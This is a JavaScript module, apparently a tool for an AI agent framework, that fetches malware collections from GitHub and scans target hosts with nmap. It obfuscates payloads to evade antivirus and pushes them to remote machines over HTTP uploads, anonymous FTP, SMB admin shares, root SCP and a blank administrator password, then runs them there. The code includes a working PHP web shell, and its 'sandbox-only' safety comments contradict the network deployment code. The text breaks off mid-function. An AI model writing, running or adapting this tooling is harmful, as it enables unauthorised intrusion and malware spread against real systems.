import { z } from "zod";
import { exec } from "node:child_process";
import { promisify } from "node:util";
import * as fs from "node:fs/promises";
import * as path from "node:path";
import { createHash } from "node:crypto";
import { logger } from "../../utils/logger.js";
import { MalwareSandboxManager } from "./docker/sandbox-manager.js";
import { FallbackSandboxManager } from "./docker/fallback-sandbox.js";

const execAsync = promisify(exec);

// Safety configuration - ALL operations within sandbox only
const SAFETY_CONFIG = {
    MAX_EXECUTION_TIME: 300000, // 5 minutes
    MAX_PAYLOAD_SIZE: 50 * 1024 * 1024, // 50MB
    ALLOWED_EXTENSIONS: ['.exe', '.bat', '.cmd', '.ps1', '.sh', '.py', '.js', '.jar', '.dll'],
    // All directories are now sandbox-contained
    SANDBOX_BASE_DIR: path.join(process.cwd(), 'malware-sandbox'),
    SANDBOX_PAYLOADS_DIR: path.join(process.cwd(), 'malware-sandbox', 'payloads'),
    SANDBOX_OUTPUT_DIR: path.join(process.cwd(), 'malware-sandbox', 'output'),
    SANDBOX_LOGS_DIR: path.join(process.cwd(), 'malware-sandbox', 'logs'),
    SANDBOX_ADDITIONAL_DIR: path.join(process.cwd(), 'malware-sandbox', 'additional')
};

// Global sandbox manager instance
let sandboxManager = null;

// Initialize sandbox manager
async function initializeSandbox() {
    if (!sandboxManager) {
        try {
            // Check if Docker is available
            try {
                await execAsync("docker --version", { timeout: 5000 });
                logger.info("🐳 Docker detected, using Docker sandbox");
                sandboxManager = new MalwareSandboxManager();
            } catch {
                logger.warn("⚠️ Docker not available, using fallback sandbox");
                sandboxManager = new FallbackSandboxManager();
            }
            
            await sandboxManager.initialize();
            await sandboxManager.downloadMalwareRepository();
            logger.info("✅ Sandbox initialized successfully");
        } catch (error) {
            logger.error(`Failed to initialize sandbox: ${error.message}`);
            throw error;
        }
    }
    return sandboxManager;
}

// Ensure safety directories exist - ALL within sandbox only
async function ensureSafetyDirectories() {
    for (const dir of [SAFETY_CONFIG.SANDBOX_BASE_DIR, SAFETY_CONFIG.SANDBOX_PAYLOADS_DIR, SAFETY_CONFIG.SANDBOX_OUTPUT_DIR, SAFETY_CONFIG.SANDBOX_LOGS_DIR, SAFETY_CONFIG.SANDBOX_ADDITIONAL_DIR]) {
        try {
            await fs.mkdir(dir, { recursive: true });
        } catch (error) {
            logger.warn(`Failed to create sandbox directory ${dir}: ${error.message}`);
        }
    }
}

// Safe GitHub repository fetcher
async function fetchMalwareRepo() {
    const repoUrl = "https://github.com/Da2dalus/The-MALWARE-Repo.git";
    const repoPath = SAFETY_CONFIG.REPO_CACHE_DIR;
    
    try {
        // Check if repo exists and is recent (less than 24 hours old)
        const gitPath = path.join(repoPath, '.git');
        const stats = await fs.stat(gitPath).catch(() => null);
        
        if (stats) {
            const age = Date.now() - stats.mtime.getTime();
            if (age < 24 * 60 * 60 * 1000) { // 24 hours
                logger.info("Using cached malware repository");
                return repoPath;
            }
        }
        
        // Clone or update repository
        logger.info("Fetching malware repository from GitHub...");
        await execAsync(`git clone --depth 1 ${repoUrl} ${repoPath}`, { timeout: 60000 });
        
        return repoPath;
    } catch (error) {
        logger.error(`Failed to fetch malware repository: ${error.message}`);
        throw new Error(`Repository fetch failed: ${error.message}`);
    }
}

// Search GitHub repositories for additional deployables
async function searchGitHubRepositories(query, limit = 10) {
    try {
        logger.info(`Searching GitHub for repositories: ${query}`);
        
        // Use GitHub API to search for repositories
        const searchUrl = `https://api.github.com/search/repositories?q=${encodeURIComponent(query)}&sort=stars&order=desc&per_page=${limit}`;
        
        const response = await fetch(searchUrl, {
            headers: {
                'Accept': 'application/vnd.github.v3+json',
                'User-Agent': 'MCP-God-Mode-WAN-Deployer'
            }
        });
        
        if (!response.ok) {
            throw new Error(`GitHub API error: ${response.status} ${response.statusText}`);
        }
        
        const data = await response.json();
        const repositories = [];
        
        for (const repo of data.items) {
            // Check if repository contains potential malware/payloads
            const isMalwareRepo = checkIfMalwareRepository(repo);
            
            if (isMalwareRepo) {
                repositories.push({
                    name: repo.name,
                    full_name: repo.full_name,
                    description: repo.description,
                    stars: repo.stargazers_count,
                    language: repo.language,
                    url: repo.html_url,
                    clone_url: repo.clone_url,
                    size: repo.size,
                    updated_at: repo.updated_at,
                    is_malware_repo: true,
                    potential_payloads: await estimatePayloadCount(repo)
                });
            }
        }
        
        return repositories;
    } catch (error) {
        logger.error(`GitHub search failed: ${error.message}`);
        throw new Error(`GitHub search failed: ${error.message}`);
    }
}

// Check if repository contains potential malware/payloads
function checkIfMalwareRepository(repo) {
    const malwareKeywords = [
        'malware', 'payload', 'exploit', 'backdoor', 'trojan', 'virus', 'ransomware',
        'rootkit', 'keylogger', 'botnet', 'spyware', 'adware', 'worm', 'pentest',
        'hacking', 'security', 'vulnerability', 'cve', 'metasploit', 'payloads'
    ];
    
    const repoText = `${repo.name} ${repo.description || ''}`.toLowerCase();
    
    return malwareKeywords.some(keyword => repoText.includes(keyword));
}

// Estimate number of potential payloads in repository
async function estimatePayloadCount(repo) {
    try {
        // Get repository contents
        const contentsUrl = `https://api.github.com/repos/${repo.full_name}/contents`;
        const response = await fetch(contentsUrl, {
            headers: {
                'Accept': 'application/vnd.github.v3+json',
                'User-Agent': 'MCP-God-Mode-WAN-Deployer'
            }
        });
        
        if (!response.ok) {
            return 0;
        }
        
        const contents = await response.json();
        let payloadCount = 0;
        
        for (const item of contents) {
            if (item.type === 'file') {
                const ext = path.extname(item.name).toLowerCase();
                if (SAFETY_CONFIG.ALLOWED_EXTENSIONS.includes(ext)) {
                    payloadCount++;
                }
            } else if (item.type === 'dir') {
                // Estimate based on directory name
                const dirName = item.name.toLowerCase();
                if (dirName.includes('payload') || dirName.includes('exploit') || 
                    dirName.includes('malware') || dirName.includes('backdoor')) {
                    payloadCount += 2; // Estimate 2 payloads per relevant directory
                }
            }
        }
        
        return Math.min(payloadCount, 50); // Cap at 50 for display purposes
    } catch (error) {
        return 0;
    }
}

// Clone additional repository for payloads
async function cloneAdditionalRepository(repoUrl, repoName) {
    try {
        const additionalRepoPath = path.join(SAFETY_CONFIG.REPO_CACHE_DIR, 'additional', repoName);
        
        // Check if already exists
        try {
            await fs.access(additionalRepoPath);
            logger.info(`Repository ${repoName} already exists, updating...`);
            await execAsync(`cd "${additionalRepoPath}" && git pull`, { timeout: 30000 });
        } catch {
            // Clone new repository
            logger.info(`Cloning additional repository: ${repoName}`);
            await execAsync(`git clone --depth 1 ${repoUrl} "${additionalRepoPath}"`, { timeout: 60000 });
        }
        
        return additionalRepoPath;
    } catch (error) {
        logger.error(`Failed to clone repository ${repoName}: ${error.message}`);
        throw new Error(`Repository clone failed: ${error.message}`);
    }
}

// Get available payloads from repository
async function getAvailablePayloads(repoPath) {
    try {
        const payloads = [];
        const entries = await fs.readdir(repoPath, { withFileTypes: true });
        
        for (const entry of entries) {
            if (entry.isDirectory() && !entry.name.startsWith('.')) {
                const payloadPath = path.join(repoPath, entry.name);
                const files = await fs.readdir(payloadPath);
                
                // Check for executable files
                const executables = files.filter(file => {
                    const ext = path.extname(file).toLowerCase();
                    return SAFETY_CONFIG.ALLOWED_EXTENSIONS.includes(ext);
                });
                
                if (executables.length > 0) {
                    payloads.push({
                        name: entry.name,
                        path: payloadPath,
                        executables: executables,
                        description: await getPayloadDescription(payloadPath),
                        source: 'main_repo'
                    });
                }
            }
        }
        
        // Also check additional repositories
        const additionalRepoPath = path.join(SAFETY_CONFIG.REPO_CACHE_DIR, 'additional');
        try {
            const additionalRepos = await fs.readdir(additionalRepoPath, { withFileTypes: true });
            
            for (const repo of additionalRepos) {
                if (repo.isDirectory()) {
                    const repoPath = path.join(additionalRepoPath, repo.name);
                    const additionalPayloads = await getAvailablePayloads(repoPath);
                    
                    // Mark as from additional repository
                    additionalPayloads.forEach(payload => {
                        payload.source = `additional_${repo.name}`;
                    });
                    
                    payloads.push(...additionalPayloads);
                }
            }
        } catch {
            // No additional repositories
        }
        
        return payloads;
    } catch (error) {
        logger.error(`Failed to enumerate payloads: ${error.message}`);
        throw new Error(`Payload enumeration failed: ${error.message}`);
    }
}

// Get payload description from README or info files
async function getPayloadDescription(payloadPath) {
    try {
        const readmeFiles = ['README.md', 'readme.txt', 'info.txt', 'description.txt'];
        
        for (const readme of readmeFiles) {
            const readmePath = path.join(payloadPath, readme);
            try {
                const content = await fs.readFile(readmePath, 'utf-8');
                return content.substring(0, 200) + (content.length > 200 ? '...' : '');
            } catch {
                continue;
            }
        }
        
        return "No description available";
    } catch {
        return "No description available";
    }
}

// Enhanced target analysis with service detection
async function analyzeTarget(target) {
    try {
        logger.info(`Analyzing target system: ${target}`);
        
        const analysis = {
            target: target,
            openPorts: [],
            services: [],
            vulnerabilities: [],
            osInfo: null,
            attackRecommendations: []
        };
        
        // Port scanning with service detection
        try {
            const { stdout } = await execAsync(`nmap -sS -sV -O -T4 --top-ports 1000 ${target}`, { timeout: 60000 });
            const lines = stdout.split('\n');
            
            for (const line of lines) {
                // Parse open ports and services
                const portMatch = line.match(/(\d+)\/tcp\s+open\s+(\w+)\s+(.+)/);
                if (portMatch) {
                    const port = parseInt(portMatch[1]);
                    const service = portMatch[2];
                    const version = portMatch[3].trim();
                    
                    analysis.openPorts.push({
                        port: port,
                        protocol: 'tcp',
                        service: service,
                        version: version
                    });
                    
                    analysis.services.push({
                        port: port,
                        service: service,
                        version: version,
                        risk: assessServiceRisk(service, version)
                    });
                }
                
                // Parse OS information
                const osMatch = line.match(/Running: (.+)/);
                if (osMatch) {
                    analysis.osInfo = osMatch[1];
                }
            }
        } catch {
            // Fallback to basic port scanning
            const commonPorts = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995, 1723, 3389, 5900, 8080];
            
            for (const port of commonPorts) {
                try {
                    const { stdout } = await execAsync(`timeout 2 bash -c "echo > /dev/tcp/${target}/${port}"`, { timeout: 5000 });
                    analysis.openPorts.push({
                        port: port,
                        protocol: 'tcp',
                        service: 'unknown',
                        version: 'unknown'
                    });
                } catch {
                    // Port is closed or filtered
                }
            }
        }
        
        // Generate attack recommendations based on analysis
        analysis.attackRecommendations = generateAttackRecommendations(analysis);
        
        return analysis;
    } catch (error) {
        logger.error(`Target analysis failed: ${error.message}`);
        return {
            target: target,
            openPorts: [],
            services: [],
            vulnerabilities: [],
            osInfo: null,
            attackRecommendations: [],
            error: error.message
        };
    }
}

// Assess service risk level
function assessServiceRisk(service, version) {
    const highRiskServices = ['ssh', 'telnet', 'ftp', 'smb', 'rdp', 'vnc'];
    const mediumRiskServices = ['http', 'https', 'smtp', 'pop3', 'imap'];
    
    if (highRiskServices.includes(service.toLowerCase())) {
        return 'high';
    } else if (mediumRiskServices.includes(service.toLowerCase())) {
        return 'medium';
    } else {
        return 'low';
    }
}

// Generate attack recommendations based on target analysis
function generateAttackRecommendations(analysis) {
    const recommendations = [];
    
    // Analyze open services and suggest appropriate attacks
    for (const service of analysis.services) {
        const { port, service: serviceName, version, risk } = service;
        
        switch (serviceName.toLowerCase()) {
            case 'ssh':
                recommendations.push({
                    payload: 'ssh_bruteforce',
                    description: 'SSH brute force attack',
                    confidence: 0.8,
                    reason: `SSH service detected on port ${port}`,
                    risk: 'high'
                });
                break;
                
            case 'smb':
                recommendations.push({
                    payload: 'eternalblue',
                    description: 'EternalBlue SMB exploit',
                    confidence: 0.9,
                    reason: `SMB service detected on port ${port} - potential for EternalBlue exploit`,
                    risk: 'critical'
                });
                break;
                
            case 'rdp':
                recommendations.push({
                    payload: 'rdp_bruteforce',
                    description: 'RDP brute force attack',
                    confidence: 0.7,
                    reason: `RDP service detected on port ${port}`,
                    risk: 'high'
                });
                break;
                
            case 'http':
                recommendations.push({
                    payload: 'web_shell',
                    description: 'Web shell deployment',
                    confidence: 0.6,
                    reason: `HTTP service detected on port ${port}`,
                    risk: 'medium'
                });
                break;
                
            case 'ftp':
                recommendations.push({
                    payload: 'ftp_bruteforce',
                    description: 'FTP brute force attack',
                    confidence: 0.7,
                    reason: `FTP service detected on port ${port}`,
                    risk: 'high'
                });
                break;
        }
    }
    
    // Add generic recommendations based on OS
    if (analysis.osInfo) {
        if (analysis.osInfo.toLowerCase().includes('windows')) {
            recommendations.push({
                payload: 'windows_persistence',
                description: 'Windows persistence mechanism',
                confidence: 0.8,
                reason: 'Windows system detected',
                risk: 'high'
            });
        } else if (analysis.osInfo.toLowerCase().includes('linux')) {
            recommendations.push({
                payload: 'linux_backdoor',
                description: 'Linux backdoor deployment',
                confidence: 0.7,
                reason: 'Linux system detected',
                risk: 'medium'
            });
        }
    }
    
    // Sort by confidence and risk
    return recommendations.sort((a, b) => {
        if (a.risk === 'critical' && b.risk !== 'critical') return -1;
        if (b.risk === 'critical' && a.risk !== 'critical') return 1;
        return b.confidence - a.confidence;
    });
}

// Port scanning functionality (legacy support)
async function scanTargetPorts(target) {
    const analysis = await analyzeTarget(target);
    return analysis.openPorts;
}

// Obfuscate payload to evade signature-based detection
async function obfuscatePayload(payloadData, payloadName) {
    try {
        logger.info(`🔒 Obfuscating payload: ${payloadName}`);
        
        // Generate random obfuscation parameters
        const obfuscationKey = crypto.randomBytes(32);
        const salt = crypto.randomBytes(16);
        const padding = crypto.randomBytes(Math.floor(Math.random() * 1024) + 512); // 512-1535 bytes
        
        // Method 1: XOR encryption with random key
        const xorEncrypted = Buffer.alloc(payloadData.length);
        for (let i = 0; i < payloadData.length; i++) {
            xorEncrypted[i] = payloadData[i] ^ obfuscationKey[i % obfuscationKey.length];
        }
        
        // Method 2: Add random padding and salt
        const paddedPayload = Buffer.concat([salt, padding, xorEncrypted, padding]);
        
        // Method 3: Simple byte rotation
        const rotatedPayload = Buffer.alloc(paddedPayload.length);
        const rotationAmount = Math.floor(Math.random() * 256);
        for (let i = 0; i < paddedPayload.length; i++) {
            rotatedPayload[i] = (paddedPayload[i] + rotationAmount) % 256;
        }
        
        // Method 4: Add polymorphic header with multiple variants
        const headerVariants = [
            // Fake PE header
            Buffer.from([0x4D, 0x5A, ...crypto.randomBytes(14), 0x90, 0x90, 0x90, 0x90, ...crypto.randomBytes(8)]),
            // Fake ELF header
            Buffer.from([0x7F, 0x45, 0x4C, 0x46, ...crypto.randomBytes(12), 0x90, 0x90, 0x90, 0x90, ...crypto.randomBytes(8)]),
            // Fake ZIP header
            Buffer.from([0x50, 0x4B, 0x03, 0x04, ...crypto.randomBytes(12), 0x90, 0x90, 0x90, 0x90, ...crypto.randomBytes(8)]),
            // Fake PNG header
            Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, ...crypto.randomBytes(8), 0x90, 0x90, 0x90, 0x90, ...crypto.randomBytes(8)]),
            // Random junk with NOP sled
            Buffer.concat([crypto.randomBytes(16), Buffer.from([0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90]), crypto.randomBytes(8)])
        ];
        
        const polymorphicHeader = headerVariants[Math.floor(Math.random() * headerVariants.length)];
        
        // Method 5: Add random sections between payload chunks
        const chunkSize = Math.floor(Math.random() * 1024) + 512; // 512-1535 bytes
        const chunks = [];
        for (let i = 0; i < rotatedPayload.length; i += chunkSize) {
            chunks.push(rotatedPayload.slice(i, i + chunkSize));
            if (i + chunkSize < rotatedPayload.length) {
                // Add random junk between chunks
                chunks.push(crypto.randomBytes(Math.floor(Math.random() * 256) + 64));
            }
        }
        
        const chunkedPayload = Buffer.concat(chunks);
        const obfuscatedPayload = Buffer.concat([polymorphicHeader, chunkedPayload]);
        
        // Generate new filename with random extension
        const randomExt = ['.tmp', '.dat', '.log', '.cfg', '.ini', '.bak'][Math.floor(Math.random() * 6)];
        const obfuscatedName = `sys_${crypto.randomBytes(8).toString('hex')}${randomExt}`;
        
        logger.info(`✅ Payload obfuscated: ${payloadName} -> ${obfuscatedName} (${obfuscatedPayload.length} bytes)`);
        
        return {
            data: obfuscatedPayload,
            name: obfuscatedName,
            originalName: payloadName,
            obfuscationKey: obfuscationKey.toString('hex'),
            salt: salt.toString('hex'),
            rotationAmount: rotationAmount
        };
        
    } catch (error) {
        logger.error(`Failed to obfuscate payload: ${error.message}`);
        // Return original payload if obfuscation fails
        return {
            data: payloadData,
            name: payloadName,
            originalName: payloadName,
            obfuscationKey: null,
            salt: null,
            rotationAmount: 0
        };
    }
}

// Deobfuscate payload on target machine
async function createDeobfuscationScript(obfuscatedPayload, target, port) {
    try {
        const { obfuscationKey, salt, rotationAmount, originalName } = obfuscatedPayload;
        
        if (!obfuscationKey) {
            // No obfuscation was applied
            return null;
        }
        
        // Create deobfuscation script
        const deobfuscationScript = `
# Deobfuscation script for ${originalName}
import sys
import os
import struct

def deobfuscate_payload():
    # Read obfuscated payload
    with open('${obfuscatedPayload.name}', 'rb') as f:
        data = f.read()
    
    # Remove polymorphic header (24 bytes)
    data = data[24:]
    
    # Remove random chunks (reverse chunking)
    chunk_size = ${Math.floor(Math.random() * 1024) + 512}
    chunks = []
    i = 0
    while i < len(data):
        chunk = data[i:i+chunk_size]
        chunks.append(chunk)
        i += chunk_size
        # Skip random junk between chunks
        if i < len(data):
            junk_size = ${Math.floor(Math.random() * 256) + 64}
            i += junk_size
    
    # Reconstruct payload
    reconstructed = b''.join(chunks)
    
    # Reverse byte rotation
    rotated_data = bytearray()
    for byte in reconstructed:
        rotated_data.append((byte - ${rotationAmount}) % 256)
    
    # Remove padding and salt
    salt_len = 16
    padding_len = 512 + (${Math.floor(Math.random() * 1024)})
    payload_start = salt_len + padding_len
    payload_end = len(rotated_data) - padding_len
    
    encrypted_payload = rotated_data[payload_start:payload_end]
    
    # XOR decryption
    key = bytes.fromhex('${obfuscationKey}')
    decrypted = bytearray()
    for i, byte in enumerate(encrypted_payload):
        decrypted.append(byte ^ key[i % len(key)])
    
    # Write deobfuscated payload
    with open('${originalName}', 'wb') as f:
        f.write(decrypted)
    
    # Make executable
    os.chmod('${originalName}', 0o755)
    
    print("Payload deobfuscated successfully")
    return '${originalName}'

if __name__ == "__main__":
    deobfuscate_payload()
`;
        
        return deobfuscationScript;
        
    } catch (error) {
        logger.error(`Failed to create deobfuscation script: ${error.message}`);
        return null;
    }
}

// Deploy payload to target machine with network transmission
async function executePayload(payload, target, port, timeout = 60000) {
    try {
        // Initialize sandbox if not already done
        const sandbox = await initializeSandbox();
        
        // Find main executable
        const mainExecutable = payload.executables.find(exe => 
            ['.exe', '.bat', '.cmd', '.ps1', '.sh', '.py', '.js'].includes(path.extname(exe).toLowerCase())
        );
        
        if (!mainExecutable) {
            throw new Error("No suitable executable found in payload");
        }
        
        const executablePath = path.join(payload.path, mainExecutable);
        
        logger.info(`🚀 Deploying payload to target: ${mainExecutable} -> ${target}:${port}`);
        
        // Step 1: Obfuscate payload to evade detection
        const payloadData = await fs.readFile(executablePath);
        const obfuscatedPayload = await obfuscatePayload(payloadData, mainExecutable);
        
        // Step 2: Deploy obfuscated payload to target machine
        const deploymentResult = await deployPayloadToTarget(obfuscatedPayload, target, port, timeout);
        
        if (!deploymentResult.success) {
            return {
                success: false,
                stdout: "",
                stderr: `Deployment failed: ${deploymentResult.error}`,
                exitCode: 1,
                deploymentResult: deploymentResult,
                sandboxOutput: null,
                sandboxLogs: null
            };
        }
        
        // Step 3: Execute payload on target machine (with deobfuscation)
        const executionResult = await executePayloadOnTarget(target, port, obfuscatedPayload, timeout);
        
        return {
            success: executionResult.success,
            stdout: executionResult.stdout,
            stderr: executionResult.stderr,
            exitCode: executionResult.exitCode || (executionResult.success ? 0 : 1),
            deploymentResult: deploymentResult,
            executionResult: executionResult,
            sandboxOutput: null,
            sandboxLogs: null
        };
        
    } catch (error) {
        logger.error(`Payload deployment failed: ${error.message}`);
        return {
            success: false,
            stdout: "",
            stderr: error.message,
            exitCode: 1,
            deploymentResult: null,
            executionResult: null,
            sandboxOutput: null,
            sandboxLogs: null
        };
    }
}

// Deploy payload to target machine using various methods
async function deployPayloadToTarget(payload, target, port, timeout) {
    try {
        logger.info(`📡 Deploying payload to ${target}:${port}`);
        
        // Handle both file path and obfuscated payload object
        let payloadData, payloadName;
        if (typeof payload === 'string') {
            // Legacy file path
            payloadData = await fs.readFile(payload);
            payloadName = path.basename(payload);
        } else {
            // Obfuscated payload object
            payloadData = payload.data;
            payloadName = payload.name;
        }
        
        // Try different deployment methods based on port
        const deploymentMethods = [
            { method: 'http', ports: [80, 8080, 8000, 3000] },
            { method: 'https', ports: [443, 8443] },
            { method: 'ftp', ports: [21, 2121] },
            { method: 'smb', ports: [445, 139] },
            { method: 'ssh', ports: [22] },
            { method: 'rdp', ports: [3389] }
        ];
        
        // Find appropriate deployment method
        const method = deploymentMethods.find(m => m.ports.includes(port));
        if (!method) {
            // Default to HTTP if port not recognized
            return await deployViaHTTP(payloadData, payloadName, target, port, timeout);
        }
        
        // Deploy using appropriate method
        switch (method.method) {
            case 'http':
            case 'https':
                return await deployViaHTTP(payloadData, payloadName, target, port, timeout);
            case 'ftp':
                return await deployViaFTP(payloadData, payloadName, target, port, timeout);
            case 'smb':
                return await deployViaSMB(payloadData, payloadName, target, port, timeout);
            case 'ssh':
                return await deployViaSSH(payloadData, payloadName, target, port, timeout);
            case 'rdp':
                return await deployViaRDP(payloadData, payloadName, target, port, timeout);
            default:
                return await deployViaHTTP(payloadData, payloadName, target, port, timeout);
        }
        
    } catch (error) {
        logger.error(`Payload deployment failed: ${error.message}`);
        return {
            success: false,
            error: error.message,
            method: 'unknown'
        };
    }
}

// Deploy payload via HTTP/HTTPS
async function deployViaHTTP(payloadData, payloadName, target, port, timeout) {
    try {
        const protocol = port === 443 || port === 8443 ? 'https' : 'http';
        const url = `${protocol}://${target}:${port}/upload`;
        
        logger.info(`🌐 Deploying via HTTP: ${url}`);
        
        // Create multipart form data
        const FormData = await import('form-data');
        const form = new FormData();
        form.append('file', payloadData, {
            filename: payloadName,
            contentType: 'application/octet-stream'
        });
        
        // Send payload
        const response = await fetch(url, {
            method: 'POST',
            body: form,
            headers: form.getHeaders(),
            timeout: timeout
        });
        
        if (response.ok) {
            return {
                success: true,
                method: 'http',
                url: url,
                response: await response.text()
            };
        } else {
            // Try alternative HTTP methods
            return await deployViaHTTPAlternative(payloadData, payloadName, target, port, timeout);
        }
        
    } catch (error) {
        logger.warn(`HTTP deployment failed, trying alternative: ${error.message}`);
        return await deployViaHTTPAlternative(payloadData, payloadName, target, port, timeout);
    }
}

// Alternative HTTP deployment methods
async function deployViaHTTPAlternative(payloadData, payloadName, target, port, timeout) {
    try {
        const protocol = port === 443 || port === 8443 ? 'https' : 'http';
        
        // Try direct file upload to common paths
        const uploadPaths = [
            '/upload',
            '/uploads',
            '/files',
            '/admin/upload',
            '/api/upload',
            '/cgi-bin/upload',
            '/wp-admin/upload.php'
        ];
        
        for (const path of uploadPaths) {
            try {
                const url = `${protocol}://${target}:${port}${path}`;
                logger.info(`🔄 Trying HTTP upload: ${url}`);
                
                const response = await fetch(url, {
                    method: 'POST',
                    body: payloadData,
                    headers: {
                        'Content-Type': 'application/octet-stream',
                        'Content-Disposition': `attachment; filename="${payloadName}"`,
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    },
                    timeout: timeout
                });
                
                if (response.ok) {
                    return {
                        success: true,
                        method: 'http_alternative',
                        url: url,
                        response: await response.text()
                    };
                }
            } catch (pathError) {
                continue;
            }
        }
        
        // If all HTTP methods fail, try to create a web shell
        return await createWebShell(payloadData, payloadName, target, port, timeout);
        
    } catch (error) {
        return {
            success: false,
            error: `HTTP deployment failed: ${error.message}`,
            method: 'http_alternative'
        };
    }
}

// Create web shell for payload execution
async function createWebShell(payloadData, payloadName, target, port, timeout) {
    try {
        const protocol = port === 443 || port === 8443 ? 'https' : 'http';
        
        // Create a simple web shell
        const webShell = `<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
if(isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "File uploaded: " . $_FILES['file']['name'];
}
?>`;
        
        // Try to upload web shell
        const shellPaths = [
            '/shell.php',
            '/upload.php',
            '/admin.php',
            '/backdoor.php',
            '/wp-content/uploads/shell.php'
        ];
        
        for (const shellPath of shellPaths) {
            try {
                const url = `${protocol}://${target}:${port}${shellPath}`;
                logger.info(`🕷️ Creating web shell: ${url}`);
                
                const response = await fetch(url, {
                    method: 'POST',
                    body: webShell,
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    },
                    timeout: timeout
                });
                
                if (response.ok) {
                    // Upload payload via web shell
                    const uploadResponse = await fetch(url, {
                        method: 'POST',
                        body: new URLSearchParams({
                            'file': new Blob([payloadData], { type: 'application/octet-stream' })
                        }),
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded'
                        },
                        timeout: timeout
                    });
                    
                    if (uploadResponse.ok) {
                        return {
                            success: true,
                            method: 'web_shell',
                            url: url,
                            payload_path: `/${payloadName}`,
                            response: await uploadResponse.text()
                        };
                    }
                }
            } catch (shellError) {
                continue;
            }
        }
        
        return {
            success: false,
            error: 'All HTTP deployment methods failed',
            method: 'web_shell'
        };
        
    } catch (error) {
        return {
            success: false,
            error: `Web shell creation failed: ${error.message}`,
            method: 'web_shell'
        };
    }
}

// Deploy payload via FTP
async function deployViaFTP(payloadData, payloadName, target, port, timeout) {
    try {
        logger.info(`📁 Deploying via FTP: ${target}:${port}`);
        
        // Use FTP client to upload payload
        const ftpCommand = `echo "open ${target} ${port}
user anonymous anonymous
binary
put ${payloadName}
quit" | ftp -n`;
        
        const { stdout, stderr } = await execAsync(ftpCommand, { timeout: timeout });
        
        return {
            success: !stderr,
            method: 'ftp',
            target: `${target}:${port}`,
            response: stdout,
            error: stderr
        };
        
    } catch (error) {
        return {
            success: false,
            error: `FTP deployment failed: ${error.message}`,
            method: 'ftp'
        };
    }
}

// Deploy payload via SMB
async function deployViaSMB(payloadData, payloadName, target, port, timeout) {
    try {
        logger.info(`💾 Deploying via SMB: ${target}:${port}`);
        
        // Use smbclient to upload payload
        const smbCommand = `echo "put ${payloadName}" | smbclient //${target}/C$ -N`;
        
        const { stdout, stderr } = await execAsync(smbCommand, { timeout: timeout });
        
        return {
            success: !stderr,
            method: 'smb',
            target: `${target}:${port}`,
            response: stdout,
            error: stderr
        };
        
    } catch (error) {
        return {
            success: false,
            error: `SMB deployment failed: ${error.message}`,
            method: 'smb'
        };
    }
}

// Deploy payload via SSH
async function deployViaSSH(payloadData, payloadName, target, port, timeout) {
    try {
        logger.info(`🔐 Deploying via SSH: ${target}:${port}`);
        
        // Use SCP to upload payload
        const scpCommand = `scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -P ${port} ${payloadName} root@${target}:/tmp/`;
        
        const { stdout, stderr } = await execAsync(scpCommand, { timeout: timeout });
        
        return {
            success: !stderr,
            method: 'ssh',
            target: `${target}:${port}`,
            response: stdout,
            error: stderr
        };
        
    } catch (error) {
        return {
            success: false,
            error: `SSH deployment failed: ${error.message}`,
            method: 'ssh'
        };
    }
}

// Deploy payload via RDP
async function deployViaRDP(payloadData, payloadName, target, port, timeout) {
    try {
        logger.info(`🖥️ Deploying via RDP: ${target}:${port}`);
        
        // RDP deployment is complex, try to use existing shares
        const rdpCommand = `net use \\\\${target}\\C$ /user:administrator "" && copy ${payloadName} \\\\${target}\\C$\\Windows\\Temp\\`;
        
        const { stdout, stderr } = await execAsync(rdpCommand, { timeout: timeout });
        
        return {
            success: !stderr,
            method: 'rdp',
            target: `${target}:${port}`,
            response: stdout,
            error: stderr
        };
        
    } catch (error) {
        return {
            success: false,
            error: `RDP deployment failed: ${error.message}`,
            method: 'rdp'
        };
    }
}

// Execute payload on target machine
async function executePayloadOnTarget(target, port, payload, timeout) {
    try {
        logger.info(`⚡ Executing payload on target: ${target}:${port}`);
        
        // Handle both string payload name and obfuscated payload object
        let payloadName, obfuscatedPayload;
        if (typeof payload === 'string') {
            payloadName = payload;
            obfuscatedPayload = null;
        } else {
            payloadName = payload.name;
            obfuscatedPayload = payload;
        }
        
        // Try different execution methods
        const executionMethods = [
            { method: 'http', ports: [80, 8080, 8000, 3000, 443, 8443] },
            { method: 'ssh', ports: [22] },
            { method: 'rdp', ports: [3389] },
            { method: 'smb', ports: [445, 139] }
        ];
        
        const method = executionMethods.find(m => m.ports.includes(port));
        if (!method) {
            return await executeViaHTTP(target, port, payload, timeout);
        }
        
        switch (method.method) {
            case 'http':
                return await executeViaHTTP(target, port, payload, timeout);
            case 'ssh':
                return await executeViaSSH(target, port, payload, timeout);
            case 'rdp':
                return await executeViaRDP(target, port, payload, timeout);
            case 'smb':
                return await executeViaSMB(target, port, payload, timeout);
            default:
                return await executeViaHTTP(target, port, payload, timeout);
        }
        
    } catch (error) {
        logger.error(`Payload execution failed: ${error.message}`);
        return {
            success: false,
            stdout: "",
            stderr: error.message,
            exitCode: 1
        };
    }
}

// Execute payload via HTTP (web shell)
async function executeViaHTTP(target, port, payload, timeout) {
    try {
        const protocol = port === 443 || port === 8443 ? 'https' : 'http';
        const shellUrl = `${protocol}://${target}:${port}/shell.php`;
        
        logger.info(`🌐 Executing via HTTP web shell: ${shellUrl}`);
        
        // Handle obfuscated payload
        let payloadName = payload;
        let deobfuscationScript = null;
        
        if (typeof payload === 'object' && payload.obfuscationKey) {
            payloadName = payload.name;
            deobfuscationScript = await createDeobfuscationScript(payload, target, port);
            
            if (deobfuscationScript) {
                // Upload deobfuscation script first
                const scriptUrl = `${protocol}://${target}:${port}/upload.php`;
                const scriptFormData = new FormData();
                scriptFormData.append('file', new Blob([deobfuscationScript], { type: 'text/plain' }), 'deobfuscate.py');
                
                await fetch(scriptUrl, {
